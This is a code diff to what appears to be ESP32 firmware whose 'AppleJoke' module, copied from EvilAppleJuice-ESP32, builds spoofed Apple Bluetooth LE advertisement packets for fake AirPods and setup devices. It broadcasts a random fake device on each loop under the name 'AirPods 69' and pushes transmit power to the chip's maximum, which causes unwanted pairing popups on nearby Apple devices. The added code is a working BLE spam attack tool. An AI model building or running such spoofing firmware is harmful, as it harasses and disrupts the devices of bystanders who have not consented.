@@ -7,13 +7,86 @@
 
 #include "../../other/EvilAppleJuice-ESP32/src/devices.hpp"
 
+#if defined(CONFIG_IDF_TARGET_ESP32C3) || defined(CONFIG_IDF_TARGET_ESP32C2) || defined(CONFIG_IDF_TARGET_ESP32S3)
+#define APPLE_JOKE_MAX_TX_POWER ESP_PWR_LVL_P21
+#elif defined(CONFIG_IDF_TARGET_ESP32H2) || defined(CONFIG_IDF_TARGET_ESP32C6)
+#define APPLE_JOKE_MAX_TX_POWER ESP_PWR_LVL_P20
+#else
+#define APPLE_JOKE_MAX_TX_POWER ESP_PWR_LVL_P9
+#endif
+
 BLEAdvertising *ApAdvertising;
 BLEServer *ApServer;
 
 bool appleJokeRunning = false;
 int appleDelay;
 
-// Here init and loop is mostly just coppied from the EvilAppleJuice-ESP32 main.cpp
+static void generateApplePacket(const AppleDevice &device, uint8_t *buffer, size_t &outLength)
+{
+    memset(buffer, 0, 31);
+
+    if (device.type == APPLE_AUDIO)
+    {
+        outLength = 31;
+        uint8_t header[] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07};
+        uint8_t body[] = {0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12};
+
+        memcpy(buffer, header, 7);
+        buffer[7] = device.modelId;
+        memcpy(buffer + 8, body, 11);
+    }
+    else if (device.type == APPLE_SETUP)
+    {
+        outLength = 23;
+        uint8_t prefix[] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1};
+        uint8_t suffix[] = {0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
+
+        memcpy(buffer, prefix, 13);
+        buffer[13] = device.modelId;
+        memcpy(buffer + 14, suffix, 9);
+    }
+}
+
+static void setAppleAdvertisementData(BLEAdvertisementData &advertisementData, const AppleDevice &device)
+{
+    uint8_t packet[31];
+    size_t packetLen;
+    generateApplePacket(device, packet, packetLen);
+    advertisementData.addData((char*)packet, packetLen);
+}
+
+static void setRandomAppleDeviceData(BLEAdvertisementData &advertisementData)
+{
+    int index = betterRandom(NUM_DEVICES);
+    setAppleAdvertisementData(advertisementData, ALL_DEVICES[index]);
+}
+
+static void randomizeAppleTxPower()
+{
+    int randVal = betterRandom(100);
+    if (randVal < 70)
+    {
+        esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, APPLE_JOKE_MAX_TX_POWER);
+    }
+    else if (randVal < 85)
+    {
+        esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, (esp_power_level_t)(APPLE_JOKE_MAX_TX_POWER - 1));
+    }
+    else if (randVal < 95)
+    {
+        esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, (esp_power_level_t)(APPLE_JOKE_MAX_TX_POWER - 2));
+    }
+    else if (randVal < 99)
+    {
+        esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, (esp_power_level_t)(APPLE_JOKE_MAX_TX_POWER - 3));
+    }
+    else
+    {
+        esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, (esp_power_level_t)(APPLE_JOKE_MAX_TX_POWER - 4));
+    }
+}
+
+// Here init and loop is mostly just copied from the EvilAppleJuice-ESP32 main.cpp
 void initAppleJoke()
 {
     appleJokeRunning = true;
@@ -25,6 +98,7 @@ void initAppleJoke()
 
     // Init EvilAppleJuice
     BLEDevice::init("AirPods 69");
+    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, APPLE_JOKE_MAX_TX_POWER);
 
     // Create the BLE Server
     ApServer = BLEDevice::createServer();
@@ -57,20 +131,8 @@ void loopAppleJoke()
 
     BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();
 
-    // Randomly pick data from one of the devices
-    // First decide short or long
-    // 0 = long (headphones), 1 = short (misc stuff like Apple TV)
-    int device_choice = betterRandom(2);
-    if (device_choice == 0)
-    {
-        int index = betterRandom(17);
-        oAdvertisementData.addData((char*)DEVICES[index], sizeof(DEVICES[index]));
-    }
-    else
-    {
-        int index = betterRandom(12);
-        oAdvertisementData.addData((char*)SHORT_DEVICES[index], sizeof(SHORT_DEVICES[index]));
-    }
+    // Randomly pick data from one of the upstream Apple devices.
+    setRandomAppleDeviceData(oAdvertisementData);
 
     /*  Page 191 of Apple's "Accessory Design Guidelines for Apple Devices (Release R20)" recommends to use only one of
           the three advertising PDU types when you want to connect to Apple devices.
@@ -156,6 +218,7 @@ void loopAppleJoke()
         delayTask(appleDelay);
     }
     ApAdvertising->stop();
+    randomizeAppleTxPower();
 }
 
 void exitAppleJoke()
